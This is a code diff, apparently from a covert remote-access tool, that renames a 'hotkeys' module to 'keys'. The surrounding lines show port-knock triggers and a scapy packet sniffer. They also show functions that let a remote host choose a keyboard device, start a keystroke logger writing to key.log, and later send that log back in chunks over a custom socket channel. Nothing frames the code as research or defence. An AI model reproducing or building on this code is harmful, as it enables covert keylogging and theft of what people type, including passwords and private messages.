@@ -21,7 +21,7 @@ from datetime import datetime
 
 from scapy.all import AsyncSniffer, ICMP, IP, TCP
 
-import hotkeys
+import keys
 
 KNOCK_PORTS = (7000, 8000, 9000)
 KNOCK_TIMEOUT_SECONDS = 5.0
@@ -1109,8 +1109,8 @@ def run_bg(ctx: Context):
         return
 
     try:
-        import hotkeys  # Import the module to modify its global variable
-        from hotkeys import list_devices_for_remote, start_logger
+        import keys  # Import the module to modify its global variable
+        from keys import list_devices_for_remote, start_logger
 
         device_list_text, devices = list_devices_for_remote()
         print(f"[BG] Sending {len(devices)} keyboard options to hosta...")
@@ -1137,7 +1137,7 @@ def run_bg(ctx: Context):
             choice = int(choice_bytes.decode("utf-8").strip())
             if 0 <= choice < len(devices):
                 # Set the module-level logger_device
-                hotkeys.logger_device = devices[choice]
+                keys.logger_device = devices[choice]
                 print(f"[BG] Selected: {devices[choice].path} - {devices[choice].name}")
                 start_logger("key.log")
                 print("[BG] Logger started successfully")
@@ -1158,8 +1158,8 @@ def stop_bg(ctx: Context):
     if not ctx.connected_to:
         return
 
-    import hotkeys
-    from hotkeys import stop_logger, get_hotkey_log_content
+    import keys
+    from keys import stop_logger, get_key_log_content
     
     print("Stopping background logger...")
     stop_logger()
@@ -1176,7 +1176,7 @@ def stop_bg(ctx: Context):
     try:
         send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
 
-        log_content = get_hotkey_log_content("key.log")
+        log_content = get_key_log_content("key.log")
         print(f"[BG] Sending log ({len(log_content)} bytes)...")
 
         if send_byte_stream_chunked(send_socket, recv_socket, source_ip,
